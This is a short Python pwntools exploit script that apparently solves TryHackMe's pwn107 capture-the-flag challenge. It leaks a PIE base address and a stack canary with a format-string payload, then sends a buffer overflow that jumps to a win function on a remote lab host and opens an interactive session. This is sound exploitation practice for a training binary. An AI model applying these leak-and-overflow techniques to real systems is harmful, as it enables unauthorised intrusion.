import time
from pwn import *

# └─$ checksec pwn101.pwn101
# [*] '/home/laurijssen/tryhackme/pwn101/pwn101.pwn101'
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
#

context.binary = elf = ELF('pwn107.pwn107')

#p = process()
p = remote("10.10.71.215", 9007)
p.clean()

p.sendline(b'%10$p %13$p') # for remote binary, leak an address at 10 that is 0xa90 (2704) from base and the canary at 13
#p.sendline(b'%9$p %13$p') # for local binary, leak an address at 9 that is 0xa90 (2704) from base and the canary at 13

p.recvuntil(b'streak: ')
leaked = p.recvline().split()
print(leaked)
base = int(leaked[0], 16) - 0xa90
canary = int(leaked[1], 16)
elf.address = base

ret = p64(0x00000a84)

payload = (b"A" * 24)
payload += p64(canary)
payload += b"A" * 8
payload += p64(base + 0x6fe) # address of a ret instruction, found via `objdump -d pwn107.pwn107 | grep ret`
payload += p64(elf.sym["get_streak"])

p.clean()
p.sendline(payload)

p.interactive()
